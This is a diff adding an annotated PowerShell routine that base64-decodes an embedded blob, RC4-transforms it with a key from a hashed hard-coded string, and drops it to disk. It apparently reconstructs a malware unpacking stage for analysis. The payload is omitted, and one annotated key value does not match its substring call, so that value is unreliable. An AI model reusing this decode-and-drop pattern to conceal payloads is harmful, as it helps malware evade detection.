@@ -1,0 +1,26 @@
+function invoke-Encryption{
+    $FileName = "ZGF0YQ==" (base64 'data')
+    $FileBase64Data = ????????
+    [Byte[]] $FileBinByte = [Byte[]][Convert]::FromBase64String($FileBase64Data)
+    [Byte[]] $FileNameByte = [Byte[]][Convert]::FromBase64String($FileName)
+    $enc = [System.Text.Encoding]::ASCII
+    $key = "Y2hjaGVz" (base64 'chches')
+    $key1 = [System.Convert]::FromBase64String($key)
+    $key1 = [System.Text.Encoding]::UTF8.GetString($key1)
+    $key1 = md5($key1) (a3157759133ff9ae17d0e301fdd7c336)
+    $key1 = $key1.Substring(8,16) (133ff9ae)
+    [Byte[]]$key1 = $enc.GetBytes($key1)
+    [Byte[]]$key2 = [Byte[]][Convert]::FromBase64String($key)
+    $FileBinByte = $key2 + $FileBinByte
+    $FileBinByte = rc4 $FileBinByte $key1
+    $tempFile=[System.Text.Encoding]::Default.GetString($FileNameByte);
+
+    if($tempFile.Length -ne 0){
+        if($FileBinByte.Length -ne 0){
+            if(Test-Path "$tempFile"){rm "$tempFile"}
+            $fs=New-Object System.IO.FileStream($tempFile,[System.IO.FileMode]::CreateNew)
+            $fs.Write($FileBinByte,0,$FileBinByte.Length)
+            $fs.Close()
+        }
+    }
+}
